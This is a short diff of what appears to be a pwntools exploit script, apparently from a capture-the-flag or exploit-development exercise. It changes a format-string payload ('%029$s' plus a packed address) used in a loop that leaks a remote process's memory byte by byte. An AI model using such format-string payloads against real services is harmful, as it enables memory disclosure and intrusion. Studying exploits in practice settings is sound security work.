@@ -58,7 +58,7 @@ try:
             addr += 1
             data += b'\x00'
         else:
-            io.sendline(f"%0263$s".encode() + b'\x00' + p32(addr))
+            io.sendline(f"%029$s".encode() + b'\x00' + p32(addr))
             line = io.recvall(0.2)
             print(line)
             data += line + b'\x00'
